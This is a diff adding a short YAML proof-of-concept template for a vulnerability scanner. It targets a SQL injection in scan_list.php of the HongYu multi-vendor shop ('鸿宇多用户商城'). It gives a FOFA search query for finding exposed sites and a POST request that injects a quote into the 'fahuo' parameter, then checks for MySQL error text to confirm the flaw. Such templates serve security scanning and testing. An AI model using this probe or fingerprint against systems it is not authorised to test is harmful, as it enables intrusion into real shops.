@@ -1,0 +1,24 @@
+id: poc-yaml-hongyujd-scan-list-php-sqli
+info:
+  name: 鸿宇多用户商城 scan_list.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 鸿宇多用户商城
+  fofa: body="content=HongYuJD" && body="68ecshopcom_360buy"
+requests:
+- method: POST
+  path: /scan_list.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: data['fahuo']=1&act=view
+  expression: status_code == 200 && contains(body,"68ecshopcom_360buy") && contains(body,"<title>智能扫货商品展示</title>")
+- method: POST
+  path: /scan_list.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: data['fahuo']=1'&act=view
+  expression: status_code == 200 && contains(body,"SQL syntax") && contains(body,"MySQL
+    Query Error") && !contains(body,"<title>智能扫货商品展示</title>")
+variables: {}
+transport: http
